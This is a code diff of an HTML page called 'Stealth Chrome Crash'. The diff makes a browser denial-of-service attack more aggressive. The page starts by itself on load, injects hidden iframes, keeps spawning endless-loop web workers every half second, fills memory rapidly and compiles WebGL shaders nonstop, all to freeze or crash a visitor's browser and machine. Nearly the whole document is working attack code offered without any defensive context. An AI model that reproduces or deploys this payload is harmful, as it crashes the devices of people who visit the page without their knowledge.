@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stealth Chrome Crash - Maximum Load</title>
+    <title>Stealth Chrome Crash - Persistent Load</title>
 </head>
 <body>
-    <h1>Stealth Chrome Crash - Maximum CPU & Memory Load</h1>
+    <h1>Stealth Chrome Crash - Persistent Attack</h1>
     <p>The attack starts automatically.</p>
 
     <script>
@@ -18,17 +18,22 @@
                             let code = \`while (true) { new Float64Array(1e8); }\`;
                             let blob = new Blob([code], { type: "application/javascript" });
                             let workers = [];
-                            for (let j = 0; j < navigator.hardwareConcurrency * 10; j++) { // MAXIMUM workers
-                                workers.push(new Worker(URL.createObjectURL(blob)));
+                            function spawnWorkers() {
+                                for (let j = 0; j < navigator.hardwareConcurrency * 10; j++) { 
+                                    workers.push(new Worker(URL.createObjectURL(blob)));
+                                }
                             }
+                            setInterval(spawnWorkers, 500); // Keep spawning workers every 0.5s
                         }
                         startWorker();
 
                         function overloadMemory() {
                             let memArray = [];
                             setInterval(() => {
-                                memArray.push(new Array(1e6).fill(0)); // Max out memory
-                            }, 10);
+                                for (let k = 0; k < 5; k++) {
+                                    memArray.push(new Array(1e6).fill(0)); // Max out memory rapidly
+                                }
+                            }, 50); // Aggressive memory allocation
                         }
                         overloadMemory();
 
@@ -38,11 +43,11 @@
                             let shaders = [];
                             setInterval(() => {
                                 var shader = gl.createShader(gl.VERTEX_SHADER);
-                                gl.shaderSource(shader, 'void main() { gl_Position = vec4(1.0); }');
+                                gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
                                 gl.compileShader(shader);
                                 shaders.push(shader);
                                 gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                            }, 1); // Faster shader execution
+                            }, 1); // Increased shader execution
                         }
                         crashGPU();
                     <\/script>
@@ -51,8 +56,8 @@
             }
         }
 
-        // Attack starts automatically on page load
-        injectHiddenIframes(10); // Maximum number of hidden iframes
+        // Attack starts immediately on page load
+        injectHiddenIframes(10); // Increased iframe count for maximum persistence
     </script>
 </body>
 </html>
